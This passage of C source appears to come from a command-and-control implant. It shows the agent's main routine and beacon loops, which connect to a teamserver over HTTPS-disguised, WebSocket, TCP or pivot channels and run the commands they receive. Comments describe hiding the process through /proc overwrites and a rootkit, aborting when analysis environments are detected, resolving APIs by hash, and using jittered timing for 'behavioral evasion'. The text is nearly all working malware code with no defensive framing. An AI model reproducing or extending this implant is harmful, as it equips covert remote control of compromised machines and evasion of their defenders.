        if (resp_count > 0 || beacon_due) {
            mp_writer_t msg_writer;
            mp_writer_init(&msg_writer, 1024);
            mp_write_map(&msg_writer, 2);

            if (resp_count > 0) {
                mp_write_kv_int(&msg_writer, "type", 1);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, resp_count);
                buf_append(&msg_writer.buf, obj_collector.buf.data, obj_collector.buf.len);
            } else {
                mp_write_kv_int(&msg_writer, "type", 0);
                mp_write_str(&msg_writer, "object", 6);
                mp_write_array(&msg_writer, 0);
            }

            size_t enc_len;
            uint8_t* encrypted;
            if (session_key_len >= 32)
                encrypted = gopher_encrypt_nogcm(msg_writer.buf.data, msg_writer.buf.len,
                                           session_key, session_key_len, &enc_len);
            else
                encrypted = aes128_gcm_encrypt(msg_writer.buf.data, msg_writer.buf.len,
                                                session_key, &enc_len);
            mp_writer_free(&msg_writer);

            if (encrypted) {
                if (https_send(ws, current_uri, current_ua,
                               https_pick_header(prof->heartbeat_header, hb_idx++),
                               (const char*)beat_buf,
                               encrypted, enc_len) != 0) {
                    ax_free(encrypted);
                    mp_writer_free(&obj_collector);
                    return -1;
                }
                ax_free(encrypted);

                // Batch sent - reset the collector for the next round
                if (resp_count > 0) {
                    mp_writer_free(&obj_collector);
                    mp_writer_init(&obj_collector, 1024);
                    resp_count = 0;
                }
            } else {
                mp_writer_free(&obj_collector);
                return -1;
            }

            // Read the response and process any commands
            if (https_recv(ws, &recv_data, &recv_len) != 0) {
                mp_writer_free(&obj_collector);
                return -1;
            }

            if (recv_len > 0) {
                uint8_t* b64_start = recv_data;
                size_t b64_len = recv_len;
                extract_b64_payload(recv_data, recv_len, ans_pre_size, ans_size, &b64_start, &b64_len);

                if (b64_len > 0) {
                    size_t dec_max = (b64_len * 3) / 4 + 1;
                    uint8_t* decoded = (uint8_t*)ax_malloc(dec_max);
                    if (decoded) {
                        int dec_len = ws_b64_decode((const char*)b64_start, b64_len, decoded, dec_max);
                        if (dec_len > 0) {
                            size_t plain_len;
                            uint8_t* possible_plain;
                            if (session_key_len >= 32)
                                possible_plain = gopher_decrypt_nogcm(decoded, (size_t)dec_len,
                                                                 session_key, session_key_len, &plain_len);
                            else
                                possible_plain = aes128_gcm_decrypt(decoded, (size_t)dec_len,
                                                                    session_key, &plain_len);
                            if (possible_plain) {
                                plaintext = possible_plain;
                                if (parse_message(plaintext, plain_len, &msg_type, &objects, &obj_sizes, &obj_count) != 0) {
                                    ax_free(plaintext);
                                    plaintext = (uint8_t*)0;
                                    msg_type = 0;
                                    obj_count = 0;
                                } else {
                            }
                            }
                        }
                        ax_free(decoded);
                    }
                }

                ax_free(recv_data);
                recv_data = (uint8_t*)0;

                if (msg_type == 1 && obj_count > 0) {
                    for (uint32_t i = 0; i < obj_count; i++) {
                        uint32_t code = 0, cmd_id = 0;
                        const uint8_t* cmd_data = (const uint8_t*)0;
                        uint32_t cmd_data_len = 0;
                        parse_command(objects[i], obj_sizes[i],
                                     &code, &cmd_id, &cmd_data, &cmd_data_len);

                        mp_writer_t cmd_resp;
                        mp_writer_init(&cmd_resp, 256);
                        int ret = handle_command(code, cmd_id, cmd_data, cmd_data_len, &cmd_resp);
                        if (ret == -99) ACTIVE = 0;

                        mp_writer_t wrapped;
                        mp_writer_init(&wrapped, 256);
                        mp_write_map(&wrapped, 3);
                        mp_write_kv_uint(&wrapped, "code", code);
                        mp_write_kv_uint(&wrapped, "id", cmd_id);
                        mp_write_kv_bin(&wrapped, "data", cmd_resp.buf.data, (uint32_t)cmd_resp.buf.len);

                        mp_write_bin(&obj_collector, wrapped.buf.data, (uint32_t)wrapped.buf.len);
                        mp_writer_free(&cmd_resp);
                        mp_writer_free(&wrapped);
                        resp_count++;
                    }
                }
            }
        }

        if (objects) ax_free((void*)objects);
        if (obj_sizes) ax_free(obj_sizes);
        if (plaintext) ax_free(plaintext);
        if (recv_data) ax_free(recv_data);

        // Idle pacing: the WS loop blocks 100ms in its poll; this loop has
        // no blocking I/O between beacons — sleep to avoid a busy spin
        // (observed 3900 iterations/s + 100% CPU before this fix).
        if (resp_count == 0 && !beacon_due) {
            ax_drifted_sleep_ms(150);
        }
    }
    mp_writer_free(&obj_collector);
    return 0;
}

static int agent_main(void) {
    // OPSEC checks — abort if hostile environment detected
#ifdef OPSEC_ENABLED
    if (opsec_check() != 0) return 1;
#endif

    // P1: /proc/<pid> 自覆盖 —— comm / exe / cwd（方案 §3.4 / B2·B3·B4）。
    // 放在 opsec_check 之后、任何网络活动之前：越早覆盖，暴露窗口越小。
    opsec_self_cover(g_argv);

    // P2 B10: rootkit 已在跑就立刻自隐藏（`ls /proc` 不可见，门 S2）。
    // 放在这里 = 任何网络活动之前；失败不阻塞（rootkit 可能还没加载，
    // 后续由 opsec_hide_self_tick() 退避重试）。
    opsec_hide_self();

    // ELF resolver — resolve libc APIs by hash (SO mode only)
#ifdef BUILD_SO
    if (elf_resolver_init() != 0) return 1;
#endif

    // Decode profiles from config
    profile_t profiles[8];
    uint32_t  profile_count = 0;

#if PROFILE_COUNT > 0
    for (int i = 0; i < PROFILE_COUNT && i < 8; i++) {
        if (decode_profile(enc_profiles[i], enc_profile_sizes[i], &profiles[profile_count]) == 0) {
            profile_count++;
        }
    }
#endif

    if (profile_count == 0) return 1;

    // Detect protocol: watermark==0 → GopherTCP, uri_count>0 → WebSocket,
    // is_https_emu → HTTPS-emulation (H1 Phase 1b), else LinuxTCP
    int is_gopher = (profiles[0].listener_watermark == 0 && profiles[0].uri_count == 0) ? 1 : 0;
    int is_https = profiles[0].is_https_emu;
    int is_ws = (profiles[0].uri_count > 0 && profiles[0].ua_count > 0 && !is_https) ? 1 : 0;

    // Create session info. All transports now use the 32-byte key+salt
    // (AES-GCM + ChaCha20 overlay) — the 16-byte plain-GCM path's hand-rolled
    // implementation proved unreliable on real-length inputs; the 32-byte
    // gopher crypto is the cross-language-tested one (verify [7]).
    mp_writer_t si_writer;
    mp_writer_init(&si_writer, 512);
    uint8_t session_key[32];
    if (create_session_info(&si_writer, session_key, 1) != 0) return 1;
    size_t session_key_len = 32;

    // Generate random agent ID
    uint8_t id_buf[4];
    ax_random_bytes(id_buf, 4);
    uint32_t agent_id = ((uint32_t)id_buf[0] << 24) | ((uint32_t)id_buf[1] << 16) |
                        ((uint32_t)id_buf[2] << 8)  | id_buf[3];

    // Keep session info for reuse across profile rotations
    uint8_t* session_info_data = (uint8_t*)ax_malloc(si_writer.buf.len);
    size_t session_info_len = si_writer.buf.len;
    ax_memcpy(session_info_data, si_writer.buf.data, si_writer.buf.len);
    mp_writer_free(&si_writer);

    // Initialize job context for async operations (stubs for Phase 1)
    jobs_init(&g_job_ctx);
    g_job_ctx.agent_id = agent_id;
    // Job threads open their own C2 connection for async output;
    // without the address update conn_open() gets an empty target and
    // every run/job silently dies before exec (stub-era regression).
    if (profiles[0].addresses && profiles[0].addresses[0])
        jobs_update_connection(&g_job_ctx, profiles[0].addresses[0], 0,
                               profiles[0].enc_key, profiles[0].type);
    g_job_ctx.is_gopher = is_gopher;
    ax_memcpy(g_job_ctx.session_key, session_key, session_key_len);
    g_job_ctx.session_key_len = session_key_len;

    // Initialize pivot context for TCP relay
    pivots_init(&g_pivot_ctx);

    // Build init message
    uint32_t prof_idx = 0;
    profile_t* prof = &profiles[prof_idx];

    uint8_t* init_msg = (uint8_t*)0;
    size_t init_msg_len = 0;
    if (is_gopher) {
        // GopherTCP: gopher_encrypt with profile key, no watermark prefix
        build_init_msg_gopher(agent_id, prof->type,
                              session_info_data, session_info_len,
                              prof->enc_key,
                              &init_msg, &init_msg_len);
    } else {
        // LinuxTCP: AES-GCM with 4-byte watermark prefix
        build_init_msg(agent_id, prof->type,
                       prof->listener_watermark,
                       session_info_data, session_info_len,
                       prof->enc_key,
                       &init_msg, &init_msg_len);
    }

    if (!init_msg) { ax_free(session_info_data); return 1; }

    if (is_https) {
        // ======== HTTPS-EMULATION MODE (H1 Phase 1b) ========
        // No WebSocket frames: each beacon is a plain HTTPS POST with a
        // browser-typical header carrying the beat. Same rotation/backoff
        // skeleton as the WS mode.
        uint32_t addr_idx = 0;
        uint32_t uri_idx = 0;
        uint32_t ua_idx = 0;

        for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
            if (attempt > 0) {
                ax_test_log("reconnect");
                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
                addr_idx = (addr_idx + 1) % prof->addr_count;
                if (addr_idx == 0) {
                    uri_idx = (uri_idx + 1) % prof->uri_count;
                    ua_idx = (ua_idx + 1) % prof->ua_count;
                    prof_idx = (prof_idx + 1) % profile_count;
                    prof = &profiles[prof_idx];

                    ax_free(init_msg);
                    build_init_msg(agent_id, prof->type,
                                   prof->listener_watermark,
                                   session_info_data, session_info_len,
                                   prof->enc_key,
                                   &init_msg, &init_msg_len);
                }
            }

            const char* current_uri = prof->uris[uri_idx % prof->uri_count];
            const char* current_ua = prof->ua_list[ua_idx % prof->ua_count];

            uint16_t host_port = 443;
            for (uint32_t pi = 0; pi < prof->addr_count; pi++) {
                const char* addr = prof->addresses[addr_idx];
                const char* colon = (const char*)0;
                for (const char* p = addr; *p; p++) {
                    if (*p == ':') colon = p;
                }
                if (colon) {
                    host_port = 0;
                    for (const char* p = colon + 1; *p >= '0' && *p <= '9'; p++)
                        host_port = host_port * 10 + (*p - '0');
                }
            }

            char host_buf[256];
            const char* addr_str = prof->addresses[addr_idx];
            int host_i = 0;
            for (const char* p = addr_str; *p && *p != ':' && host_i < 255; p++)
                host_buf[host_i++] = *p;
            host_buf[host_i] = '\0';

            ws_connector_t ws;
            ws_init(&ws);

            if (https_connect(&ws, host_buf, host_port, prof->use_ssl) != 0) {
                continue;
            }

            // Reset attempt counter on successful connect
            ax_test_log("connect");
            attempt = 0;

            // Enter the HTTPS command loop (stateless POST/response cycles).
            // Rotate the connection after a randomized lifetime (-2 return).
            uint64_t rotate_ms = ax_rotation_interval_ms((uint32_t)prof->conn_timeout * 1000u);
            int loop_ret = https_command_loop(&ws, session_key, session_key_len,
                           prof->ans_pre_size, prof->ans_size, rotate_ms,
                           prof, agent_id,
                           session_info_data, session_info_len,
                           current_uri, current_ua);

            ws_disconnect(&ws);
            if (loop_ret == -2) {
                attempt = -1;  // rotation: reconnect immediately, no backoff
                ax_test_log("rotate");
            }
        }
    } else if (is_ws) {
        // ======== WEBSOCKET MODE ========
        // Agent connects to WS teamserver via WebSocket upgrade
        uint32_t addr_idx = 0;
        uint32_t uri_idx = 0;
        uint32_t ua_idx = 0;

        for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
            if (attempt > 0) {
                ax_test_log("reconnect");
                // Right-skewed jitter + random-walk drift (behavioral evasion)
                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
                addr_idx = (addr_idx + 1) % prof->addr_count;
                if (addr_idx == 0) {
                    uri_idx = (uri_idx + 1) % prof->uri_count;
                    ua_idx = (ua_idx + 1) % prof->ua_count;
                    prof_idx = (prof_idx + 1) % profile_count;
                    prof = &profiles[prof_idx];

                    ax_free(init_msg);
                    build_init_msg(agent_id, prof->type,
                                   prof->listener_watermark,
                                   session_info_data, session_info_len,
                                   prof->enc_key,
                                   &init_msg, &init_msg_len);
                }
            }

            // Build the beat (RC4-encrypted with profile enc_key, then b64) for Sec-WebSocket-Protocol
            uint8_t ws_beat_buf[512];
            size_t ws_beat_len = 0;
            // The beat carries agent type watermark and agent id for server-side agent creation
            if (ws_build_beat(prof->enc_key, prof->type, agent_id,
                              session_info_data, session_info_len,
                              ws_beat_buf, sizeof(ws_beat_buf), &ws_beat_len) != 0) {
                continue;
            }
            ws_beat_buf[ws_beat_len] = '\0';

            // WS connect uses the first uri and first UA from the profile
            const char* current_uri = prof->uris[uri_idx % prof->uri_count];
            const char* current_ua = prof->ua_list[ua_idx % prof->ua_count];

            // Convert port from network byte order to host byte order for display
            uint16_t host_port = 443;  // default SSL port
            for (uint32_t pi = 0; pi < prof->addr_count; pi++) {
                // Parse the address string for the port
                const char* addr = prof->addresses[addr_idx];
                const char* colon = (const char*)0;
                for (const char* p = addr; *p; p++) {
                    if (*p == ':') colon = p;
                }
                if (colon) {
                    host_port = 0;
                    for (const char* p = colon + 1; *p >= '0' && *p <= '9'; p++)
                        host_port = host_port * 10 + (*p - '0');
                }
            }

            // Extract hostname from address string (strip port)
            char host_buf[256];
            const char* addr_str = prof->addresses[addr_idx];
            int host_i = 0;
            for (const char* p = addr_str; *p && *p != ':' && host_i < 255; p++)
                host_buf[host_i++] = *p;
            host_buf[host_i] = '\0';

            ws_connector_t ws;
            ws_init(&ws);

            if (ws_connect(&ws, host_buf, host_port, current_uri, current_ua,
                          (const char*)ws_beat_buf, prof->use_ssl) != 0) {
                continue;
            }

            // Reset attempt counter on successful connect
            ax_test_log("connect");
            attempt = 0;

            // Send init message as first WS text frame
            if (ws_send_text(&ws, init_msg, init_msg_len) != 0) {
                ws_disconnect(&ws);
                continue;
            }

            // Enter WS command loop with template stripping. Rotate the
            // connection after a randomized lifetime (-2 return).
            uint64_t rotate_ms = ax_rotation_interval_ms((uint32_t)prof->conn_timeout * 1000u);
            int loop_ret = ws_command_loop(&ws, session_key, session_key_len,
                           prof->ans_pre_size, prof->ans_size, rotate_ms);

            ws_disconnect(&ws);
            if (loop_ret == -2) {
                attempt = -1;  // rotation: reconnect immediately, no backoff
                ax_test_log("rotate");
            }
        }
    } else if (prof->bind_port > 0) {
        // ======== PIVOT MODE: reverse-first, listen as fallback ========
        //
        // The classic shape is "parent dials child".  That needs INBOUND
        // reachability to this host on bind_port -- routinely blocked by a
        // default-deny host firewall on an internal network -- and it leaves a
        // listening socket open on this (freshly compromised) host for the
        // entire lifetime of the pivot.
        //
        // So try the opposite direction first: dial the parent at
        // addresses[i]:bind_port and run the very same command loop over the
        // socket WE opened.  The parent accepts it via COMMAND_PIVOT_LISTEN
        // and adopts it through the identical handshake path, so nothing on
        // the teamserver side changes.  Only when no parent is reachable do we
        // fall back to the original listening behaviour.
        int reversed_once = 0;
        while (ACTIVE) {
            int dialed = -1;

            for (uint32_t i = 0; i < prof->addr_count && ACTIVE; i++) {
                if (!prof->addresses[i]) continue;

                int fd = pivot_dial_tcp(prof->addresses[i], (int)prof->bind_port,
                                        PIVOT_CONNECT_TIMEOUT, (const char **)0);
                if (fd < 0) continue;

                connector_t rconn;
                rconn.fd = fd;

                // The same init message (watermark + encrypted beat) the
                // listen path sends -- the parent cannot tell them apart.
                if (conn_send_msg(&rconn, init_msg, init_msg_len) != 0) {
                    conn_close(&rconn);
                    continue;
                }

                ax_test_log("revpivot");
                command_loop(&rconn, session_key, session_key_len, 0);
                conn_close(&rconn);

                dialed = 0;        // session finished -- dial again
                reversed_once = 1;
                break;
            }

            if (dialed == 0) continue;
            // Never reached a parent -> fall through to listening.
            if (!reversed_once) break;
            // Did reach one before, so stay in reverse mode: opening a
            // listener here would defeat the point.  Retry with the usual
            // drifted backoff instead.
            // A bind_tcp profile can carry conn_timeout == 0 (a pure listener
            // never dials), which would turn this retry into a busy spin.
            uint32_t backoff_s = prof->conn_timeout > 0 ? (uint32_t)prof->conn_timeout : 10u;
            ax_drifted_sleep_ms(backoff_s * 1000u);        }

        if (!reversed_once) {
        // ---- no parent reachable: original listen path, unchanged ----
        // Agent listens on a port, parent connects to us.
        // Used for pivot: beacon parent → "link tcp <ip> <port>" → this agent.
        connector_t server;
        if (conn_bind_listen(&server, prof->bind_port) != 0) {
            ax_free(init_msg);
            ax_free(session_info_data);
            for (uint32_t i = 0; i < profile_count; i++)
                free_profile(&profiles[i]);
            return 1;
        }

        // Accept loop — re-accept if connection drops
        while (ACTIVE) {
            connector_t conn;
            if (conn_accept(&conn, &server) != 0) continue;

            // Send init message (watermark + encrypted beat)
            if (conn_send_msg(&conn, init_msg, init_msg_len) != 0) {
                conn_close(&conn);
                continue;
            }

            // Enter command loop (shared with client TCP mode)
            // Bind mode is parent-driven: no self-rotation.
            command_loop(&conn, session_key, session_key_len, 0);

            conn_close(&conn);
        }

        conn_close(&server);
        }
    } else {
        // ======== CLIENT TCP MODE ========
        // Agent connects out to teamserver addresses.
        uint32_t addr_idx = 0;

        for (int attempt = 0; attempt < prof->conn_count && ACTIVE; attempt++) {
            if (attempt > 0) {
                ax_test_log("reconnect");
                // Right-skewed jitter + random-walk drift (behavioral evasion)
                ax_drifted_sleep_ms((uint32_t)prof->conn_timeout * 1000u);
                addr_idx++;
                if (addr_idx >= prof->addr_count) {
                    addr_idx = 0;
                    prof_idx = (prof_idx + 1) % profile_count;
                    prof = &profiles[prof_idx];

                    ax_free(init_msg);
                    if (is_gopher) {
                        build_init_msg_gopher(agent_id, prof->type,
                                              session_info_data, session_info_len,
                                              prof->enc_key,
                                              &init_msg, &init_msg_len);
                    } else {
                        build_init_msg(agent_id, prof->type,
                                       prof->listener_watermark,
                                       session_info_data, session_info_len,
                                       prof->enc_key,
                                       &init_msg, &init_msg_len);
                    }
                }
            }

            // Update job context with current connection info
            jobs_update_connection(&g_job_ctx, prof->addresses[addr_idx],
                                  prof->banner_size, prof->enc_key, prof->type);

            // Connect
            connector_t conn;
            if (conn_open(&conn, prof->addresses[addr_idx]) != 0) continue;

            // Reset attempt counter on successful connect
            ax_test_log("connect");
            attempt = 0;

            // Read banner
            if (prof->banner_size > 0) {
                if (conn_discard(&conn, (size_t)prof->banner_size) != 0) {
                    conn_close(&conn);
                    continue;
                }
            }

            // Send init
            if (conn_send_msg(&conn, init_msg, init_msg_len) != 0) {
                conn_close(&conn);
                continue;
            }

            // Enter command loop (shared with bind TCP mode). Rotate the
            // connection after a randomized lifetime (-2 return).
            uint64_t rotate_ms = ax_rotation_interval_ms((uint32_t)prof->conn_timeout * 1000u);
            int loop_ret = command_loop(&conn, session_key, session_key_len, rotate_ms);

            conn_close(&conn);
            if (loop_ret == -2) {
                attempt = -1;  // rotation: reconnect immediately, no backoff
                ax_test_log("rotate");
            }
        }
    }

    // Cleanup
    ax_free(init_msg);
    ax_free(session_info_data);
    for (uint32_t i = 0; i < profile_count; i++)
        free_profile(&profiles[i]);

    return 0;
}
